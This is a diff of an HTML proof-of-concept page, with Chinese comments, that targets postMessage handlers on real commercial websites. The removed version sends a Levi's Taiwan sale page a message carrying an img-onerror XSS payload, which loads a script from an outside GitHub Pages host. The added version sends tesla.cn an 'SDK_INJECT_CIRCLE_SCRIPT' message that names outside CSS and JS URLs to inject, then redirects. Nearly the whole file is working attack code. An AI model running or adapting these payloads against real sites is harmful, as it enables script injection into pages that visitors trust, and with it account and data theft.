@@ -1,20 +1,44 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>A网站（跨域版）</title>
+    <meta charset="UTF-8">
+</head>
 <body>
-<script>
-hwin = window.open("https://www.levis.com.tw/SalePage/Index/11303715");  //SalePage/Index/11519255
-const messageData = {
-    MsgHeader: "SizeAI_Fast",  // 核心触发标识
-    DP_CODE: "valid_code",     // 不能是"4_2"或"-1"，可自定义有效值
-    Top_Per: "95%",            // 需显示的百分比数据（示例值）
-    Top_Size: "L",             // 代码中后续逻辑依赖的字段（如RecomText = e.data.Top_Size）
-    Sec_Per: "<img src=x hidden onerror=s=createElement('script');body.appendChild(s);s.src='//johnstonemees.github.io/poc/fetch.js?v=1';>",            // 代码中用于设置#front_sec_per的字段
-    Sec_Size: "M",             // 代码中用于设置#front_sec_size的字段
-    Auto: true,                // 代码中gtag统计依赖的字段（可选，若不需要统计可设为false）
-    TID: Date.now() - 1000     // 配合Auto的时间戳（需满足 (new Date).getTime() - TID < 79488e5，示例为当前时间减1秒）
-}; 
-setInterval(function(){
-hwin.postMessage(messageData,"*")
-},4000)
-</script>
+    <h1>A网站（跨域场景）</h1>
+    <button id="triggerBtn">打开跨域B网站并触发输出</button>
+
+    <script>
+        const B_ORIGIN = 'https://www.tesla.cn'; // 替换为实际B网站的完整域名（带端口）
+        let bWindow = null;
+
+        // 关键：在A窗口自身定义vds属性，跨域B网站依然可以从event.source读取
+        window.vds = 1; // 这个值会被B网站打印
+
+        document.getElementById('triggerBtn').addEventListener('click', () => {
+            // 1. 打开跨域的旧B窗口
+            bWindow = window.open(`${B_ORIGIN}`, '_blank');
+            
+            // 2. 等待B窗口加载完成后发送消息
+            const sendMessage = () => {
+                if (bWindow && !bWindow.closed) {
+                    // 发送匹配B网站监听规则的消息，targetOrigin必须严格匹配B的域名
+                    bWindow.postMessage({
+                        type: "SDK_INJECT_CIRCLE_SCRIPT",
+                        cssURL:"https://www.example.com/1.css",
+                        jsURL:"https://www.example.com/1.js"
+                    }, B_ORIGIN); // 这里必须是B的完整域名，不能用'*'
+                    
+                    console.log('已向跨域B网站发送触发消息，A窗口vds值为:', window.vds);
+                    
+                    // 发送完成后立即跳转到新B窗口，无任何延迟
+                    window.location.href = `${B_ORIGIN}`;
+                } else {
+                    setTimeout(sendMessage, 100);
+                }
+            };
+            sendMessage();
+        });
+    </script>
 </body>
 </html>
